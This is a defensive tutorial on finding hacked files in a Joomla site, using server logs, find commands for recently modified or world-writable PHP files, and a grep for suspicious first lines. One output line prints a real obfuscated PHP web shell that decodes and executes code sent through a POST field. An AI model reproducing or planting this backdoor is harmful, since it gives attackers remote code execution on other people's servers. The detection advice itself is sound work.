---
description: How to find hacked Joomla files. How to analize your Joomla site to tell if it has been compromised or hacked.
---

## Overview

Like every popular Content Management System, there is always going to
be at risk of being attacked or hacked. This article explore some
methods to try to detect the integrity of your website.

Monitor your site regularly.

## Check web server logs

Check primarily for brute force attacks and attempts to upload
files. With Apache in Ubuntu that would tipically mean to analyze
`/var/log/apache2/access.log` and `/var/log/apache2/error.log`

For example, there is someone playing around one of my Joomla websites
trying to explode Wordpress vulnerabilities:

<pre class="shell">
<samp>
<span class="shell-prompt">/var/log/apache2/$</span> <kbd>grep POST access.log</kbd>
XXXXXXXX.com:80 193.XXX.XXX.XXX - - [26/Jan/2017:00:07:03 +0000] "POST /wp-content/themes/method/lib/scripts/dl-skin.php HTTP/1.1" 500 363 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0"
XXXXXXXX.com:80 193.XXX.XXX.XXX - - [26/Jan/2017:00:07:14 +0000] "POST /wp-content/themes/modular/lib/scripts/dl-skin.php HTTP/1.1" 500 363 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0"
XXXXXXXX.com:80 193.XXX.XXX.XXX - - [26/Jan/2017:00:07:25 +0000] "POST /wp-content/themes/myriad/lib/scripts/dl-skin.php HTTP/1.1" 500 363 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0"
XXXXXXXX.com:80 193.XXX.XXX.XXX - - [26/Jan/2017:00:07:56 +0000] "POST /wp-content/themes/persuasion/lib/scripts/dl-skin.php HTTP/1.1" 500 363 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0"
</samp>
</pre>

## Detect modified PHP files

You can look for PHP files that were modified recently, or after some
date you are sure didn't perform anything to the source code. 

That would show new possibly uploaded scripts or modified files with
injected code in them.

### Find files modified recently

To find recently modified files: <kbd>find /path/to/dir -type f -mtime -7 -ls</kbd>.
The `-mtime` parameter detects when file's data was last modified
*n*24* hours ago, in that case we analyze the previous 7 days.

<pre class="shell">
<samp>
<span class="shell-prompt">$</span> <kbd>find . -type f -mtime -7 -ls</kbd>
</samp>
</pre>

### Find files modified after a specific date

List files in given directory modified after given date <kbd> find
/path/to/dir -newermt "yyyy-mm-dd"</kbd>.

> -newerXY reference
>               Compares the timestamp of the current file with reference.  The reference argument is normally the name  of  a  file
>               (and  one  of its timestamps is used for the comparison) but it may also be a string describing an absolute time.  X
>               and Y are placeholders for other letters, and these letters select which time belonging to how reference is used for
>               the comparison.
> 
>               a   The access time of the file reference
>               B   The birth time of the file reference
>               c   The inode status change time of reference
>               m   The modification time of the file reference
>               t   reference is interpreted directly as a time
> 
> <footer class="blockquote-footer"> <cite>Find man page</cite></footer>
{: class="blockquote"}

In this example we look for files modified with the current directory
as the base directory and modified after "2016-12-01".

<pre class="shell">
<samp>
<span class="shell-prompt">$</span> <kbd>find . -newermt "2017-01-25" -ls</kbd>
1089538    4 drwxr-xr-x   2 marcanuy www-data     4096 Jan 25 04:13 ./website/logs
</samp>
</pre>

### Finding hacked files with pattern matching

Most of the time injected code will be obfuscated, making it harder to
look for obvious patterns, but we can try some alternatives though.

This code would be tipically inserted as the first line of the PHP
file, starting with a variable, so we can look for that pattern, first
line starting with `<?php $`:

<pre class="shell">
<samp>
<span class="shell-prompt">$</span> <kbd>grep -m 1 -r '^<?php \$' .</kbd>
./website/components/com_users/views/profile/tmpl/default_params.php:<?php $fields = $this->form->getFieldset('params'); ?>
./website/administrator/cache/com_ajax3j/9411v11.php:<?php $coi=chr(97).chr(115)."\x73".chr(101)."\x72"."\x74";$zioj=chr(98).chr
(97)."\x73"."\x65"."\x36".chr(52)."\x5f"."\x64".chr(101)."c"."\x6f".chr(100).chr(101);$jd=chr(115)."\x74".chr(114)."\x5f"."r".chr(111)
."\x74"."1"."3";@$coi(@$zioj(@$jd($_POST[chr(100).chr(97)."t".chr(97)])));die(); ?>
</samp>
</pre>

First line of the output looks fine, but the second line looks a bit
more than suspicious code, we can decode it and understand what it is
doing before removing it.

## Files with wrong permissions

Check out for writable upload directories. The `find` command can be used to scan for files and folder with
permission 777.

<pre class="shell">
<span class="shell-prompt">$</span> <kbd>find . \(-type f -o -type d\) -perm 0777 -print </kbd>
</pre>

> -perm mode
>               File's  permission  bits  are  exactly  mode (octal or sym‐
>               bolic).  Since an exact match is required, if you  want  to
>               use this form for symbolic modes, you may have to specify a
>               rather complex mode string.  For example `-perm  g=w'  will
>               only  match  files  which have mode 0020 (that is, ones for
>               which group write permission is the only  permission  set).
>               It  is more likely that you will want to use the `/' or `-'
>               forms, for example `-perm -g=w',  which  matches  any  file
>               with  group write permission.  See the EXAMPLES section for
>               some illustrative examples.
> 
> <footer class="blockquote-footer"> <cite>Find man page</cite></footer>
{: class="blockquote"}


Then we can modify it a bit to scan through all the 777 files on the
server and show ones with `.php` to look for uploaded scripts:

<pre class="shell">
<span class="shell-prompt">$</span> <kbd>find . -name "*php" -type f -perm 777</kbd>
</pre>

## Conclusion

A lot of people recommends to install a clean backup after being
hacked, this approach will fail sooner or later because you need to
know what failed to prevent happening again.

This article covers some basic strategies for identifying compromised
files, attacks are constant with varying methods so it is important to
know commands and strategies to recover our sites and keep them safe.

## References

- <http://www.gregfreeman.io/2013/how-to-tell-if-your-php-site-has-been-compromised/>
- <https://www.bluebridgedev.com/hacked-joomla-files>
- <https://www.joomshaper.com/blog/my-joomla-site-was-hacked-what-to-do>
- <https://www.google.com/transparencyreport/safebrowsing/diagnostic/index.html>
- The Joomla Hacking Compendium <https://www.exploit-db.com/papers/15780/>
